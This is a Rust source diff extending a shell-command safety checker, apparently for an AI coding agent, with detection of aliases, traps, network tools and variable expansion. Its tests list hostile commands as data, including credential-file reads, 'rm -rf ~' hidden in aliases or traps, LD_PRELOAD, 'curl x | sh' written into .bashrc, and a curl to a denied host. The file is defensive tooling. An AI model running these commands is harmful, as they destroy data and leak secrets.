+        // another one; `sh` expands aliases in scripts too.
+        "alias" if tokens.iter().skip(1).any(|token| token.contains('=')) => Some(NestedCode {
+            reason: "Command defines an alias that changes what later commands run".to_string(),
+            detail: "An alias replaces a command name with other commands, so the commands after it cannot be checked.",
+            exact_only: true,
+        }),
+        // `trap '…' EXIT` runs its commands later, when the signal arrives.
+        "trap"
+            if tokens
+                .get(1)
+                .is_some_and(|action| !action.is_empty() && !action.starts_with('-')) =>
+        {
+            Some(NestedCode {
+                reason: "Command sets a trap that runs commands later (trap)".to_string(),
+                detail: "The trap's commands are not checked like a command and could do anything.",
+                exact_only: true,
+            })
+        }
+        // `enable -f lib.so name` loads a builtin from a library, `hash -p
+        // path name` makes a command name run another program.
+        "enable" if short("f") => Some(NestedCode {
+            reason: "Command loads shell builtins from a library (enable -f)".to_string(),
+            detail: "A loaded builtin runs code the checks cannot see.",
+            exact_only: true,
+        }),
+        "hash" if short("p") => Some(NestedCode {
+            reason: "Command maps a command name to another program (hash -p)".to_string(),
+            detail: "Later commands with that name would run a different program.",
+            exact_only: true,
+        }),
         _ => None,
     }
 }
@@ -2281,8 +3120,182 @@ fn network_targets(program: &str, tokens: &[String], bases: &[Base]) -> NetworkT
             remote_spec_hosts(&parsed.positionals)
         }
         "git" => git_targets(tokens, bases),
+        "openssl" => openssl_targets(arguments),
+        "socat" => NetworkTargets::Unknown("relays data between addresses that cannot be checked"),
+        // A looked-up or probed name reaches the servers of its domain, so the
+        // name itself is where the data goes.
+        "dig" | "nslookup" | "host" | "drill" | "whois" | "ping" | "ping6" | "traceroute"
+        | "traceroute6" | "tracepath" | "mtr" | "nmap" | "ssh-keyscan" => {
+            if arguments.iter().any(|argument| argument == "-f") {
+                return NetworkTargets::Unknown("reads its targets from a file");
+            }
+            lookup_targets(arguments)
+        }
+        "lynx" | "w3m" | "links" | "elinks" | "aria2c" | "axel" | "lftp" | "websocat" | "grpcurl" => {
+            url_targets(arguments)
+        }
+        "gh" | "glab" => forge_targets(program, arguments),
+        "python" | "python2" | "python3"
+            if arguments.iter().enumerate().any(|(index, argument)| {
+                let module = match argument.strip_prefix("-m") {
+                    Some("") => arguments.get(index + 1).map(String::as_str),
+                    Some(attached) => Some(attached),
+                    None => None,
+                };
+                matches!(module, Some("http.server" | "SimpleHTTPServer"))
+            }) =>
+        {
+            NetworkTargets::Unknown("serves files over the network")
+        }
+        "php" if arguments.iter().any(|argument| argument == "-S") => {
+            NetworkTargets::Unknown("serves files over the network")
+        }
         _ => NetworkTargets::None,
     }
+}
+
+/// `openssl s_client -connect host:port` and friends: the hosts they
+/// connect to. The other subcommands work locally.
+fn openssl_targets(arguments: &[String]) -> NetworkTargets {
+    let Some(subcommand) = arguments.first() else {
+        return NetworkTargets::None;
+    };
+    if !matches!(subcommand.as_str(), "s_client" | "s_time" | "ocsp") {
+        return NetworkTargets::None;
+    }
+    let mut hosts: Vec<String> = Vec::new();
+    let mut index = 1;
+    while let Some(argument) = arguments.get(index) {
+        index += 1;
+        if argument == "-proxy" || argument.starts_with("-proxy=") {
+            return NetworkTargets::Unknown("uses a proxy, so the real host is unknown");
+        }
+        let target = match argument.as_str() {
+            "-connect" | "-host" | "-url" => {
+                index += 1;
+                arguments.get(index - 1).cloned()
+            }
+            flag if flag.starts_with('-') => continue,
+            // OpenSSL 3 also takes the target as `host:port`. A flag's value
+            // (`-servername x`) is counted too, which only ever asks more.
+            positional => Some(positional.to_string()),
+        };
+        let Some(target) = target else {
+            return NetworkTargets::Unknown("the target host could not be determined");
+        };
+        let host = if target.contains("://") {
+            remote_host(&target)
+        } else {
+            remote_host(&format!("https://{target}"))
+        };
+        match host {
+            Some(host) if !hosts.contains(&host) => hosts.push(host),
+            Some(_) => {}
+            None => return NetworkTargets::Unknown("names a target that is not a plain host"),
+        }
+    }
+    if hosts.is_empty() {
+        if subcommand == "s_client" {
+            // Without `-connect` it talks to localhost:4433.
+            hosts.push("localhost".to_string());
+        } else {
+            return NetworkTargets::Unknown("the target host could not be determined");
+        }
+    }
+    NetworkTargets::Hosts(hosts)
+}
+
+/// Whether an argument names a host: `localhost`, an IP address or a dotted
+/// name.
+fn looks_like_host(value: &str) -> bool {
+    let value = value.trim_start_matches('[').trim_end_matches(']');
+    !value.is_empty()
+        && (value == "localhost"
+            || value.parse::<std::net::IpAddr>().is_ok()
+            || (value.contains('.')
+                && value
+                    .chars()
+                    .all(|character| character.is_ascii_alphanumeric() || matches!(character, '.' | '-' | '_'))))
+}
+
+/// Lookups and probes: every argument (or `@server`) that names a host.
+fn lookup_targets(arguments: &[String]) -> NetworkTargets {
+    let mut hosts: Vec<String> = Vec::new();
+    for argument in arguments {
+        if argument.starts_with('-') || argument.starts_with('+') {
+            continue;
+        }
+        let candidate = argument.strip_prefix('@').unwrap_or(argument);
+        if looks_like_host(candidate) {
+            let host = candidate
+                .trim_start_matches('[')
+                .trim_end_matches(']')
+                .trim_end_matches('.')
+                .to_lowercase();
+            if !hosts.contains(&host) {
+                hosts.push(host);
+            }
+        }
+    }
+    if hosts.is_empty() {
+        NetworkTargets::Unknown("the target host could not be determined")
+    } else {
+        NetworkTargets::Hosts(hosts)
+    }
+}
+
+/// Text browsers and downloaders: the hosts of the URLs they are given.
+fn url_targets(arguments: &[String]) -> NetworkTargets {
+    let mut hosts: Vec<String> = Vec::new();
+    for argument in arguments.iter().filter(|argument| !argument.starts_with('-')) {
+        let host = if argument.contains("://") {
+            remote_host(argument)
+        } else if looks_like_host(argument.split(['/', ':']).next().unwrap_or_default()) {
+            remote_host(&format!("http://{argument}"))
+        } else {
+            None
+        };
+        if let Some(host) = host {
+            if !hosts.contains(&host) {
+                hosts.push(host);
+            }
+        }
+    }
+    if hosts.is_empty() {
+        NetworkTargets::Unknown("the target host could not be determined")
+    } else {
+        NetworkTargets::Hosts(hosts)
+    }
+}
+
+/// The GitHub and GitLab CLIs talk to their forge for nearly every
+/// subcommand; `--hostname` points them at another one.
+fn forge_targets(program: &str, arguments: &[String]) -> NetworkTargets {
+    let local = arguments.first().is_none_or(|first| {
+        matches!(
+            first.as_str(),
+            "--version" | "version" | "help" | "--help" | "-h" | "completion" | "alias" | "config"
+        )
+    });
+    if local {
+        return NetworkTargets::None;
+    }
+    let mut hosts: Vec<String> = Vec::new();
+    for (index, argument) in arguments.iter().enumerate() {
+        let value = match argument.strip_prefix("--hostname") {
+            Some("") => arguments.get(index + 1).cloned(),
+            Some(attached) => attached.strip_prefix('=').map(str::to_string),
+            None => continue,
+        };
+        match value.as_deref().and_then(|value| remote_host(&format!("https://{value}"))) {
+            Some(host) => hosts.push(host),
+            None => return NetworkTargets::Unknown("the target host could not be determined"),
+        }
+    }
+    if hosts.is_empty() {
+        hosts.push(if program == "gh" { "github.com" } else { "gitlab.com" }.to_string());
+    }
+    NetworkTargets::Hosts(hosts)
 }
 
 fn ssh_redirects(parsed: &ParsedArguments<'_>) -> bool {
@@ -2710,8 +3723,36 @@ fn without_harmless_redirects(tokens: &[String]) -> Vec<String> {
 /// safely splittable and `None` is returned. Backticks and `$(` are *not*
 /// separators: they stay inside their segment so the operator check still
 /// catches them.
-fn split_segments(command: &str) -> Option<Vec<String>> {
-    let mut segments = vec![String::new()];
+///
+/// Each segment also records how it runs (see [`Segment`]), which decides
+/// whether the variables it assigns are certain for the segments after it.
+fn split_segment_parts(command: &str) -> Option<Vec<Segment>> {
+    let mut segments = vec![Segment::default()];
+    let mut depth = 0usize;
+    let mut unbalanced = false;
+    // Starts the next segment after `separator`.
+    let mut start = |segments: &mut Vec<Segment>, separator: Separator| {
+        if let Some(last) = segments.last_mut() {
+            if matches!(separator, Separator::Pipe | Separator::Background) {
+                last.forked = true;
+            }
+        }
+        match separator {
+            Separator::Open => depth += 1,
+            Separator::Close => match depth.checked_sub(1) {
+                Some(outer) => depth = outer,
+                None => unbalanced = true,
+            },
+            _ => {}
+        }
+        segments.push(Segment {
+            text: String::new(),
+            depth,
+            conditional: unbalanced
+                || matches!(separator, Separator::And | Separator::Or | Separator::Pipe),
+            forked: false,
+        });
+    };
     let mut chars = command.chars().peekable();
     let mut in_single = false;
     let mut in_double = false;
@@ -2724,13 +3765,13 @@ fn split_segments(command: &str) -> Option<Vec<String>> {
     while let Some(character) = chars.next() {
         if escaped {
             escaped = false;
-            segments.last_mut()?.push(character);
+            segments.last_mut()?.text.push(character);
             continue;
         }
         match character {
             '\\' if !in_single => {
                 escaped = true;
-                segments.last_mut()?.push(character);
+                segments.last_mut()?.text.push(character);
                 continue;
             }
             '\'' if !in_double && !in_backtick => in_single = !in_single,
@@ -2739,7 +3780,7 @@ fn split_segments(command: &str) -> Option<Vec<String>> {
             // contents) in the current segment so the operator check sees them.
             '`' if !in_single => {
                 in_backtick = !in_backtick;
-                segments.last_mut()?.push(character);
+                segments.last_mut()?.text.push(character);
                 continue;
             }
             // Command substitution expands even inside double quotes. Keep the
@@ -2748,7 +3789,7 @@ fn split_segments(command: &str) -> Option<Vec<String>> {
             '$' if !in_single && chars.peek() == Some(&'(') => {
                 chars.next();
                 substitution_depth += 1;
-                let segment = segments.last_mut()?;
+                let segment = &mut segments.last_mut()?.text;
                 segment.push('$');
                 segment.push('(');
                 continue;
@@ -2756,37 +3797,45 @@ fn split_segments(command: &str) -> Option<Vec<String>> {
             '(' if !in_single => {
                 if substitution_depth > 0 {
                     substitution_depth += 1;
-                    segments.last_mut()?.push(character);
+                    segments.last_mut()?.text.push(character);
                 } else if in_double || in_backtick {
                     // Literal text inside quotes, or inside a backtick.
-                    segments.last_mut()?.push(character);
+                    segments.last_mut()?.text.push(character);
                 } else {
-                    segments.push(String::new());
+                    start(&mut segments, Separator::Open);
                 }
                 continue;
             }
             ')' if !in_single => {
                 if substitution_depth > 0 {
                     substitution_depth -= 1;
-                    segments.last_mut()?.push(character);
+                    segments.last_mut()?.text.push(character);
                 } else if in_double || in_backtick {
-                    segments.last_mut()?.push(character);
+                    segments.last_mut()?.text.push(character);
                 } else {
-                    segments.push(String::new());
+                    start(&mut segments, Separator::Close);
                 }
                 continue;
             }
             ';' | '|' | '\n' | '\r'
                 if !in_single && !in_double && !in_backtick && substitution_depth == 0 =>
             {
+                let mut separator = if character == '|' {
+                    Separator::Pipe
+                } else {
+                    Separator::Sequence
+                };
                 // Swallow `||` instead of emitting an empty segment for the
                 // second character of the operator.
-                if let Some(peeked) = chars.peek() {
+                if let Some(&peeked) = chars.peek() {
                     if matches!(peeked, '&' | '|' | '>') {
+                        if character == '|' && peeked == '|' {
+                            separator = Separator::Or;
+                        }
                         chars.next();
                     }
                 }
-                segments.push(String::new());
+                start(&mut segments, separator);
                 continue;
             }
             '&' if !in_single && !in_double && !in_backtick && substitution_depth == 0 => {
@@ -2794,29 +3843,44 @@ fn split_segments(command: &str) -> Option<Vec<String>> {
                 // so a file descriptor duplication like `2>&1` stays in one
                 // segment instead of splitting off a bogus `1` command.
                 let redirects = matches!(
-                    segments.last().and_then(|segment| segment.chars().last()),
+                    segments.last().and_then(|segment| segment.text.chars().last()),
                     Some('>') | Some('<')
                 ) || chars.peek() == Some(&'>');
                 if redirects {
-                    segments.last_mut()?.push('&');
+                    segments.last_mut()?.text.push('&');
                     continue;
                 }
                 // `&&` is a single operator; swallow its second `&`.
-                if chars.peek() == Some(&'&') {
+                let separator = if chars.peek() == Some(&'&') {
                     chars.next();
-                }
-                segments.push(String::new());
+                    Separator::And
+                } else {
+                    Separator::Background
+                };
+                start(&mut segments, separator);
                 continue;
             }
             _ => {}
         }
-        segments.last_mut()?.push(character);
+        segments.last_mut()?.text.push(character);
     }
     if in_single || in_double || in_backtick || escaped || substitution_depth > 0 {
         return None;
     }
-    segments.retain(|segment| !segment.trim().is_empty());
-    Some(segments)
+    // Empty segments (`a && (b)` leaves one before the `(`) are dropped, but
+    // the condition they carried applies to the segment after them.
+    let mut kept: Vec<Segment> = Vec::with_capacity(segments.len());
+    let mut carried = false;
+    for mut segment in segments {
+        if segment.text.trim().is_empty() {
+            carried |= segment.conditional;
+            continue;
+        }
+        segment.conditional |= carried;
+        carried = false;
+        kept.push(segment);
+    }
+    Some(kept)
 }
 
 /// Replaces heredoc bodies (and their terminator lines) with spaces so a body
@@ -3775,6 +4839,15 @@ fn candidate_paths(tokens: &[String], dangerous: bool, bases: &[Base]) -> Vec<St
             index += 1;
             continue;
         }
+        match message_flag(&program, token) {
+            // The next argument is message text, not a file.
+            Some(true) => {
+                index += 1;
+                continue;
+            }
+            Some(false) => continue,
+            None => {}
+        }
         // Redirections and their targets were collected above.
         if parse_redirect(token).is_some() {
             continue;
@@ -3789,6 +4862,11 @@ fn candidate_paths(tokens: &[String], dangerous: bool, bases: &[Base]) -> Vec<St
                 grep_pattern_seen = true;
                 continue;
             }
+        }
+        // A value the shell only computes at run time could be any path.
+        if token.contains(UNKNOWN_PATH) {
+            paths.push(token.clone());
+            continue;
         }
         // A command substitution can hide the paths it touches
         // (`echo "$(cat /etc/passwd)"` becomes a single quoted token), so its
@@ -3830,6 +4908,30 @@ fn candidate_paths(tokens: &[String], dangerous: bool, bases: &[Base]) -> Vec<St
         }
     }
     paths
+}
+
+/// Flags of `git` and `gh` whose value is message text rather than a file
+/// (`git commit -m "$(cat <<'EOF' …)"`): `Some(true)` when the value is the
+/// next argument, `Some(false)` when it is attached (`--message=…`).
+fn message_flag(program: &str, token: &str) -> Option<bool> {
+    let flags: &[&str] = match program {
+        "git" => &["-m", "--message"],
+        "gh" => &["-t", "--title", "-b", "--body"],
+        _ => return None,
+    };
+    // `git commit -am …` ends a short flag cluster with `m`.
+    let cluster = program == "git"
+        && token.len() > 2
+        && token.starts_with('-')
+        && !token.starts_with("--")
+        && token.ends_with('m');
+    if flags.contains(&token) || cluster {
+        return Some(true);
+    }
+    flags
+        .iter()
+        .any(|flag| flag.starts_with("--") && token.starts_with(&format!("{flag}=")))
+        .then_some(false)
 }
 
 /// The path a command argument names, or `None` for plain data. `@file` is
@@ -4038,7 +5140,7 @@ fn expand_glob(path: &Path) -> Option<Vec<PathBuf>> {
 
 /// True when a folder is too broad to offer as a one-click whitelist: the
 /// filesystem root, the home directory, or anything above it (`/Users`).
-fn is_too_broad_folder(folder: &Path) -> bool {
+pub(crate) fn is_too_broad_folder(folder: &Path) -> bool {
     if folder.parent().is_none() {
         return true;
     }
@@ -4066,8 +5168,10 @@ fn folder_suggestions(absolute: &Path) -> Vec<PathBuf> {
     };
     let mut folders: Vec<PathBuf> = Vec::new();
     for base in bases {
-        // Whitelisting `/` would switch the outside check off entirely.
-        if base.parent().is_some() && !folders.contains(&base) {
+        // Whitelisting `/` or the home directory would switch the outside
+        // check off for everything below it (`rm -rf ~/Documents/x` would run
+        // unasked), so a file directly in one of them offers no folder.
+        if !is_too_broad_folder(&base) && !folders.contains(&base) {
             folders.push(base.clone());
         }
         if let Some(parent) = base.parent() {
@@ -4846,10 +5950,17 @@ mod tests {
 
     #[test]
     fn shell_assignments_and_null_devices_are_not_touched_paths() {
+        // Assigning a path touches nothing ...
         assert_eq!(
-            evaluate_project("db=~/Library/pnpm/store/index.db; sqlite3 \"$db\" 'SELECT 1'", &[]),
+            evaluate_project("db=~/Library/pnpm/store/index.db", &[]),
             CommandDecision::Allow,
         );
+        // ... but using it opens that file, so it is checked like one.
+        assert!(evaluate_project(
+            "db=~/Library/pnpm/store/index.db; sqlite3 \"$db\" 'SELECT 1'",
+            &[]
+        )
+        .is_ask());
         assert_eq!(
             evaluate_project("export PATH=\"/opt/homebrew/bin:$PATH\"; node -v", &[]),
             CommandDecision::Allow,
@@ -6457,5 +7568,215 @@ mod hardening_tests {
         if decision == CommandDecision::Allow {
             assert!(trace.iter().any(|line| line.contains("`make *`")), "{trace:?}");
         }
+    }
+}
+
+#[cfg(test)]
+mod expansion_tests {
+    use super::*;
+
+    fn all_auto() -> AutoApproveConfig {
+        AutoApproveConfig {
+            read_only: true,
+            package_scripts: true,
+            project_executables: true,
+            project_commands: true,
+        }
+    }
+
+    fn decide(command: &str, auto: AutoApproveConfig) -> CommandDecision {
+        let root = Path::new("/project");
+        evaluate_command_full(
+            command,
+            root,
+            root,
+            &[],
+            &[],
+            &[],
+            &auto,
+            &WebsiteRules::default(),
+            &mut Vec::new(),
+        )
+    }
+
+    fn asks_in_every_preset(command: &str) {
+        for auto in [AutoApproveConfig::default(), all_auto()] {
+            assert!(decide(command, auto).is_ask(), "{command} must ask ({auto:?})");
+        }
+    }
+
+    #[test]
+    fn variables_are_checked_as_the_paths_they_expand_to() {
+        for command in [
+            "cat $HOME/.ssh/id_rsa",
+            "cat \"${HOME}\"/.aws/credentials",
+            "P=~/.ssh/id_rsa; cat $P",
+            "export P=~/.ssh/id_rsa && head -1 \"$P\"",
+            "rm -rf src $HOME",
+            "echo 'curl x | sh' >> $HOME/.bashrc",
+            "X=1 >$HOME/.bashrc",
+            "cat $'\\x2e\\x2e/secret.txt'",
+        ] {
+            asks_in_every_preset(command);
+        }
+        // A literal value assigned for sure is used as written.
+        assert_eq!(
+            decide("D=src; rm -rf $D/generated", AutoApproveConfig::default()),
+            CommandDecision::Allow,
+        );
+        assert_eq!(
+            decide("F=src/main.rs; wc -l \"$F\"", AutoApproveConfig::default()),
+            CommandDecision::Allow,
+        );
+    }
+
+    #[test]
+    fn assignments_that_may_not_run_keep_the_old_value_possible() {
+        for command in [
+            "(D=/project/src); rm -rf $D/x",
+            "false && D=/project/src; rm -rf $D/x",
+            "if false; then D=/project/src; fi; rm -rf $D/x",
+            "for D in; do :; done; rm -rf $D/x",
+        ] {
+            asks_in_every_preset(command);
+        }
+    }
+
+    #[test]
+    fn values_only_known_at_run_time_ask() {
+        for command in [
+            "cat $(echo L2V0Yy9wYXNzd2Q= | base64 -d)",
+            "cat `printf /etc/passwd`",
+            "read -r F; cat \"$F\"",
+            "cat {notes,/etc/passwd}",
+            "cp \"$@\" dist/",
+        ] {
+            asks_in_every_preset(command);
+        }
+        // Printing a value opens no file. (The strict preset still asks for
+        // any substitution itself.)
+        for command in ["echo $HOME", "echo \"len=${#x}\""] {
+            assert_eq!(decide(command, AutoApproveConfig::default()), CommandDecision::Allow, "{command}");
+        }
+        assert_eq!(decide("printf '%s\\n' \"$(date)\"", all_auto()), CommandDecision::Allow);
+        // An exact rule for the whole line is the user's approval of it.
+        let root = Path::new("/project");
+        let command = "cat $(git ls-files | head -1)";
+        assert_eq!(
+            evaluate_command_full(
+                command,
+                root,
+                root,
+                &[],
+                &[CommandRule::Exact(command.into())],
+                &[],
+                &all_auto(),
+                &WebsiteRules::default(),
+                &mut Vec::new(),
+            ),
+            CommandDecision::Allow,
+        );
+    }
+
+    #[test]
+    fn brace_lists_never_name_the_program() {
+        for command in ["{rm,-rf,~}", "{cat,~/.ssh/id_rsa}", "$EDITOR notes.txt"] {
+            asks_in_every_preset(command);
+        }
+        assert_eq!(decide("echo {a,b}", all_auto()), CommandDecision::Allow);
+    }
+
+    #[test]
+    fn substitutions_are_judged_as_commands() {
+        let root = Path::new("/project");
+        let sites = WebsiteRules {
+            allowed: vec!["example.com".into()],
+            denied: vec!["evil.test".into()],
+        };
+        let decide_with = |command: &str| {
+            evaluate_command_full(command, root, root, &[], &[], &[], &all_auto(), &sites, &mut Vec::new())
+        };
+        let CommandDecision::Ask { hosts, .. } =
+            decide_with("echo $(curl -s https://other.test/i)")
+        else {
+            panic!("the network call inside the substitution must ask");
+        };
+        assert_eq!(hosts, vec!["other.test".to_string()]);
+        assert!(matches!(
+            decide_with("echo \"$(curl https://evil.test)\""),
+            CommandDecision::Deny { .. }
+        ));
+        assert!(decide_with("echo $(cat .env)").is_ask());
+        // The common commit message form stays allowed.
+        let commit = "git commit -m \"$(cat <<'EOF'\nfix: keep the prompt\nEOF\n)\"";
+        assert_eq!(decide_with(commit), CommandDecision::Allow);
+    }
+
+    #[test]
+    fn variables_that_change_what_runs_ask() {
+        for command in [
+            "GIT_EXTERNAL_DIFF='rm -rf ~' git diff",
+            "PS4='$(rm -rf ~)'; set -x; ls",
+            "PATH=.:$PATH ls",
+            "export PATH=\"node_modules/.bin:$PATH\"; ls",
+            "LD_PRELOAD=./x.so ls",
+            "env GIT_SSH_COMMAND='sh -c x' git fetch",
+            "read PATH",
+            "alias ls='rm -rf ~'",
+            "trap 'rm -rf ~' EXIT",
+            "hash -p ./tool ls",
+        ] {
+            asks_in_every_preset(command);
+        }
+        for command in [
+            "NODE_ENV=production npm run build",
+            "export PATH=\"$HOME/.cargo/bin:$PATH\"; cargo --version",
+            "RUST_BACKTRACE=1 cargo test",
+        ] {
+            assert_eq!(decide(command, all_auto()), CommandDecision::Allow, "{command}");
+        }
+    }
+
+    #[test]
+    fn function_bodies_are_checked_like_commands() {
+        asks_in_every_preset("function f { rm -rf ~; }; f");
+        asks_in_every_preset("function f { curl -s https://other.test; }");
+    }
+
+    #[test]
+    fn more_network_tools_follow_the_website_rules() {
+        for (command, host) in [
+            ("openssl s_client -connect other.test:443", "other.test"),
+            ("dig +short secret.other.test", "secret.other.test"),
+            ("nslookup other.test", "other.test"),
+            ("ping -c 1 other.test", "other.test"),
+            ("gh gist create src/main.rs", "github.com"),
+            ("lynx -dump https://other.test", "other.test"),
+        ] {
+            let CommandDecision::Ask { hosts, .. } = decide(command, all_auto()) else {
+                panic!("{command} must ask for {host}");
+            };
+            assert_eq!(hosts, vec![host.to_string()], "{command}");
+        }
+        for command in ["python3 -m http.server 8000", "php -S 0.0.0.0:8000", "socat - TCP:x:80"] {
+            assert!(decide(command, all_auto()).is_ask(), "{command}");
+        }
+        for command in ["ping -c 1 127.0.0.1", "openssl rand -hex 8", "gh --version"] {
+            assert_eq!(decide(command, all_auto()), CommandDecision::Allow, "{command}");
+        }
+    }
+
+    #[test]
+    fn files_directly_in_home_offer_no_folder_to_whitelist() {
+        let Some(home) = std::env::var_os("HOME").filter(|home| !home.is_empty()) else {
+            return;
+        };
+        let CommandDecision::Ask { outside_folders, .. } =
+            decide("cat ~/.gitconfig", AutoApproveConfig::default())
+        else {
+            panic!("expected an ask decision");
+        };
+        let home = PathBuf::from(home).display().to_string();
+        assert!(!outside_folders.contains(&home), "{outside_folders:?}");
     }
 }
